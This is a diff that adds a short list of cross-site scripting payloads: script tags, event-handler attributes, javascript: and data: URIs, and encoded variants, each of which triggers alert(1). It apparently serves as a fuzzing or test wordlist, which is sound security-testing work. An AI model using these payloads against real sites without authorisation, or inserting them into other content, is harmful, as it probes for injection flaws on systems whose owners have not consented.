@@ -1,0 +1,18 @@
+<script>alert(1)</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src="javascript:alert(1)">
+" onmouseover="alert(1)" x="
+' onfocus='alert(1)' autofocus='
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<details open ontoggle=alert(1)>
+<video><source onerror="alert(1)">
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+&#60;script&#62;alert(1)&#60;/script&#62;
+<svg/onload=alert(1)>
